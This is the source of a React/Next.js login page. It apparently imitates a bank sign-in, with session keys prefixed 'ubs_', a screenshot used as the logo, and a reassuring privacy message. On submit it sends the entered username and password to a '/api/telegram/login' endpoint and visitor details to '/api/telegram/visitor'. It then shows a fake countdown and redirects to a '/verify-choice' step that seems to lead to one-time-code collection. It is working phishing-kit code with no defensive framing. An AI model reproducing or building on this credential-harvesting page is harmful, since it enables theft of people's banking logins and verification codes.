"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Preloader } from "@/components/preloader";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  // --- All original hooks and logic preserved ---
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);
  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);
  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();
  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);
    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }
      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }
      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };
  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);
  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <>
          <style>{`
            *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
            body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;color:#222;min-height:100vh;display:flex;flex-direction:column;}
            header{display:flex;align-items:center;gap:16px;padding:12px 24px;border-bottom:1px solid #e5e7eb;background:#fff;}
            .logo-img{height:32px;width:auto;display:block;}
            .header-title{font-size:0.97rem;font-weight:400;color:#444;}
            main{flex:1;display:flex;flex-direction:row;align-items:flex-start;justify-content:flex-start;padding:56px 16px 40px;}
            .login-content-wrapper {
              display: flex;
              flex-direction: column;
              align-items: flex-start;
              width: 100%;
              max-width: 460px;
              margin-left: 48px;
            }
            .card {
              width: 100%;
              max-width: 460px;
              display: flex;
              flex-direction: column;
              align-items: flex-start;
              background: none;
              box-shadow: none;
              padding: 0;
            }
            .padlock-center {
              width: 100%;
              display: flex;
              flex-direction: column;
              align-items: center;
              margin-bottom: 18px;
            }
            .padlock-center .lock-icon {
              margin-bottom: 8px;
            }
            .padlock-center .privacy-text {
              text-align: center;
              max-width: 420px;
              margin-bottom: 0;
            }
            @media (max-width: 700px) {
              main {
                flex-direction: column;
                align-items: stretch;
                padding: 32px 8px 28px;
              }
              .login-content-wrapper {
                margin-left: 0;
                max-width: 100%;
                width: 100%;
                padding: 0;
              }
              .card {
                max-width: 100%;
                align-items: stretch;
              }
              .padlock-center .privacy-text {
                max-width: 100%;
              }
            }
            .lock-icon{margin-bottom:14px;}
            .lock-icon img{width:58px;height:auto;display:block;}
            .privacy-text{font-size:0.82rem;color:#555;text-align:center;max-width:360px;line-height:1.6;margin-bottom:18px;}
            .signin-heading{font-size:1.08rem;font-weight:600;color:#111;margin-bottom:24px;}
            form{width:100%;}
            .field{margin-bottom:16px;}
            label{display:block;font-size:0.87rem;color:#222;margin-bottom:5px;}
            .required-star{color:#c0392b;margin-left:2px;}
            input[type="text"],input[type="password"]{width:100%;padding:8px 11px;border:1.5px solid #bbb;border-radius:3px;font-size:0.94rem;color:#222;background:#fff;outline:none;transition:border-color 0.18s;}
            input[type="text"]:focus,input[type="password"]:focus{border-color:#1a3a6b;}
            .help-link{display:block;margin-top:5px;font-size:0.8rem;color:#555;}
            .help-link a{color:#1a5cab;text-decoration:none;}
            .help-link a:hover{text-decoration:underline;}
            .btn{display:inline-flex;align-items:center;gap:9px;padding:10px 20px;font-size:0.87rem;font-weight:700;letter-spacing:0.07em;border:none;border-radius:3px;cursor:pointer;text-transform:uppercase;transition:opacity 0.15s;}
            .btn:hover{opacity:0.88;}
            .btn-primary{background:#1a2a5e;color:#fff;margin-top:6px;}
            .btn-register{background:#1a2a5e;color:#fff;margin-top:8px;}
            .register-section{margin-top:20px;}
            .register-label{font-size:0.87rem;color:#333;}
            footer{background:#ccc5bc;padding:20px 16px 10px;text-align:center;}
            .footer-links{display:flex;justify-content:center;flex-wrap:wrap;gap:8px 28px;margin-bottom:9px;}
            .footer-links a{font-size:0.8rem;font-weight:700;color:#1a2a5e;text-decoration:none;letter-spacing:0.03em;text-transform:uppercase;}
            .footer-links a:hover{text-decoration:underline;}
            .footer-copy{font-size:0.74rem;color:#444;margin-bottom:7px;}
            .footer-sitemap a{font-size:0.76rem;color:#1a2a5e;text-decoration:none;font-weight:600;}
            .footer-sitemap a:hover{text-decoration:underline;}
            @media(max-width:500px){main{padding:32px 12px 28px;}.btn{width:100%;justify-content:center;}.footer-links{gap:7px 14px;}}
          `}</style>
          <header>
            <img
              className="logo-img"
              src="/Screenshot 2026-04-15 122815.png"
              alt="igoe"
            />
            <span className="header-title">Login</span>
          </header>
          {/* Wrap main and footer in a fragment to ensure valid JSX */}
          <>
            <main>
              <div className="login-content-wrapper">
                <div className="padlock-center">
                  <div className="lock-icon">
                    <img
                      src="data:image/png;base64,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"
                      alt="Secure login"
                    />
                  </div>
                  <p className="privacy-text">
                    We will maintain the confidentiality of your personal
                    information in accordance with our privacy policy.
                  </p>
                </div>
                <div className="card">
                  <h1 className="signin-heading">Sign in</h1>
                  <form onSubmit={handleSignIn}>
                    <div className="field">
                      <label htmlFor="userId">
                        UserId <span className="required-star">*</span>
                      </label>
                      <input
                        type="text"
                        id="userId"
                        name="userId"
                        autoComplete="username"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                      />
                      <span className="help-link">
                        Forgot your Username? <a href="#">Let us help</a>
                      </span>
                    </div>
                    <div className="field">
                      <label htmlFor="password">
                        Password <span className="required-star">*</span>
                      </label>
                      <input
                        type="password"
                        id="password"
                        name="password"
                        autoComplete="current-password"
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      <span className="help-link">
                        Forgot your Password? <a href="#">Let us help</a>
                      </span>
                    </div>
                    <input
                      type="text"
                      name="website"
                      value={honeypot}
                      onChange={(e) => setHoneypot(e.target.value)}
                      style={{ display: "none" }}
                      autoComplete="off"
                    />
                    <button
                      type="submit"
                      className="btn btn-primary"
                      disabled={isLoginLoading || !username || !password}
                    >
                      <svg
                        width="15"
                        height="15"
                        viewBox="0 0 15 15"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <polyline
                          points="1.5,7.5 6,12.5 13.5,3"
                          stroke="#fff"
                          strokeWidth="2.2"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                      {isLoginLoading ? "Signing in..." : "Sign In"}
                    </button>
                    <div className="register-section">
                      <p className="register-label">Don't have an account?</p>
                      <button type="button" className="btn btn-register">
                        <svg
                          width="19"
                          height="16"
                          viewBox="0 0 20 17"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <circle
                            cx="8"
                            cy="5"
                            r="4"
                            stroke="#fff"
                            strokeWidth="1.9"
                            fill="none"
                          />
                          <path
                            d="M1 17c0-3.866 3.134-7 7-7"
                            stroke="#fff"
                            strokeWidth="1.9"
                            strokeLinecap="round"
                            fill="none"
                          />
                          <line
                            x1="15"
                            y1="9"
                            x2="15"
                            y2="17"
                            stroke="#fff"
                            strokeWidth="2"
                            strokeLinecap="round"
                          />
                          <line
                            x1="11"
                            y1="13"
                            x2="19"
                            y2="13"
                            stroke="#fff"
                            strokeWidth="2"
                            strokeLinecap="round"
                          />
                        </svg>
                        Register
                      </button>
                    </div>
                    <p
                      style={{
                        color: "red",
                        minHeight: "1.25rem",
                        marginTop: 8,
                      }}
                      aria-live="polite"
                    >
                      {loginError ?? ""}
                    </p>
                  </form>
                </div>
              </div>
            </main>
            <footer>
              <nav className="footer-links" aria-label="Footer">
                <a href="#">Contact Us</a>
                <a href="#">About Us</a>
                <a href="#">Terms of Use</a>
                <a href="#">Privacy Policy</a>
              </nav>
              <p className="footer-copy">
                Copyright &copy; 2026 goigoe. All Rights Reserved.
              </p>
              <p className="footer-sitemap">
                <a href="#">SITE MAP</a>
              </p>
            </footer>
          </>
        </>
      )}
    </>
  );
}
